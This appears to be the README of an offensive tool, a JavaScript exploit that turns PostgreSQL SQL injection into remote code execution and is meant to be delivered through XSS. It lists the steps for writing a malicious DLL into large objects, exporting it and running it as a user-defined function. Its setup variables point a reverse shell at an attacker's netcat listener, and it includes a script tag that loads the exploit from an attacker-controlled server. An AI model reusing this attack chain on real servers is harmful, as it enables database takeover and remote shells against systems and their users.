# Postgres-SQLi-RCE.js
PostgreSQL Large Objects and UDF (User Defined Functions) RCE exploit re-written in javascript, for easy chaining with XSS

## Methdology
```
Step 1: Create a DLL file that will contain our malicious code
Step 2: Inject a query that creates a large object from an arbitrary remote file on disk
Step 3: Inject a query that updates page 0 of the newly created large object with the first 2KB of our DLL
Step 4: Inject queries that insert additional pages into the pg_largeobject table to contain the remainder of our DLL
Step 5: Inject a query that exports our large object (DLL) onto the remote server file system
Step 6: Inject a query that creates a PostgreSQL User Defined Function (UDF) based on our exported DLL
Step 7: Inject a query that executes our newly created UDF
```

## Requirements <br>
1. **jQuery:** If the target page does not have jQuery included, you can add it from exploit script like [this](https://stackoverflow.com/questions/1140402/how-to-add-jquery-in-js-file/36343307) 
2. **Linux/Windows/MAC OSX:** To generate postgres extension

## Setup
Follow this article to generate a database extension for the target machine <br>
https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions

Then, set the following variables
```javascript
var nc_ip = "192.168.XXX.XXX"; //Attacker's netcat listener IP
var nc_port = "4444"; //Attacker's netcat listener port
var url= "/vulnerable-path";

var udf="<Add the database extension hex code here >"; //xxd rev_shell.dll | cut -d" " -f 2-9 | sed 's/ //g' | tr -d '\n' > rev_shell.dll.txt

//Reference: https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions
```
## Exploitation: XSS Chaining
```javascript
<script src=http://<attacker-server>/postgres_linux_rce.js></script>
```




